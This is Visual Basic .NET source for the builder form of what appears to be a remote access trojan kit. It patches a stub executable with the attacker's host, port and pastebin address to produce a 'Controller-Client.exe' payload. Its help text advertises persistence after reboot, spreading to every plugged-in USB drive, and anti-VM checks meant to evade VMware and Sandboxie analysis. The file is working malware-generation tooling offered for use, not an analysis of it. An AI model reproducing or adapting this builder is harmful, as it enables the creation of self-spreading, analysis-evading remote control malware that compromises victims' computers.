Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Security.Cryptography

Public Class Builder

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click

        If host.Text.ToLower.Contains("pastebin.com".ToLower) AndAlso Not host.Text.ToLower.Contains("/raw/".ToLower) Then
            MsgBox("Your pastebin should be like this https://pastebin.com/raw/pJS2zFAz", MsgBoxStyle.Information)
            Return
        End If

        If (exename.Text = "") Then
            exename.Text = "Wservices.exe"
        End If

        If DRPATH.Text = "" Then
            DRPATH.Text = "Temp"
        End If

        If IO.Path.GetExtension(exename.Text) <> ".exe" Then
            exename.Text = exename.Text + ".exe"
        End If

        If (DRFOLDER.Text = "") Then
            DRFOLDER.Text = Nothing
        End If

        If Not File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (host.Text = "") Then
            Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (port.Text = "") Then
            Interaction.MsgBox("Enter Port", MsgBoxStyle.Critical, Nothing)
            Return
        Else
            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If (str = "%LHOST%") Then
                                                current.Operand = host.Text
                                            End If
                                            If (str = "%LPORT%") Then
                                                current.Operand = port.Text
                                            End If
                                            If (str = "%STNAME%") Then
                                                current.Operand = Randomisi(10)
                                            End If
                                            If (str = "%LEXE%") Then
                                                current.Operand = exename.Text
                                            End If
                                            If (str = "%DRPATH%") Then
                                                current.Operand = DRPATH.Text
                                            End If
                                            If (str = "%DRCHK%") Then
                                                current.Operand = CHKDR.Checked.ToString
                                            End If
                                            If (str = "%DRFOLDER%") Then
                                                current.Operand = DRFOLDER.Text
                                            End If
                                            If (str = "%SPUSB%") Then
                                                current.Operand = SPUSB.Checked.ToString
                                            End If
                                            If (str = "%ANTIV%") Then
                                                current.Operand = ANTI_VM.Checked.ToString
                                            End If
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next

                definition.Write(Application.StartupPath + "\" + "Controller-Client.exe")
                MsgBox("Your Controller Has been Created Successfully", vbInformation, "DONE!")
                Me.Close()

            Catch ex1 As Exception
                MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                Return
            End Try
        End If

    End Sub

    Public Function Randomisi(ByVal lenght As Integer) As String
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()".ToCharArray()
        For i As Integer = 1 To lenght
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub CHKDR_CheckedChanged(sender As Object, e As EventArgs) Handles CHKDR.CheckedChanged
        If CHKDR.Checked = True Then
            exename.Enabled = True
            DRPATH.Enabled = True
        Else
            exename.Enabled = False
            DRPATH.Enabled = False
        End If
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.port.Text = Form1.Myport
        exename.Enabled = False
        DRPATH.Enabled = False
        CHKDR.Checked = False
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        MsgBox("
Pastebin URL = example https://pastebin.com/raw/PDC3d2bU it must start with https and contain /raw/

PORT = Your port. the default is 6652

Drop file = It will make sure that you client.exe will run after PC is restarted

MISC = Spreading your controller on any USB that is plugged-in, Also Anti-VM will prevent your controller to run on VMware or Sandboxie or XP machines
")
    End Sub
End Class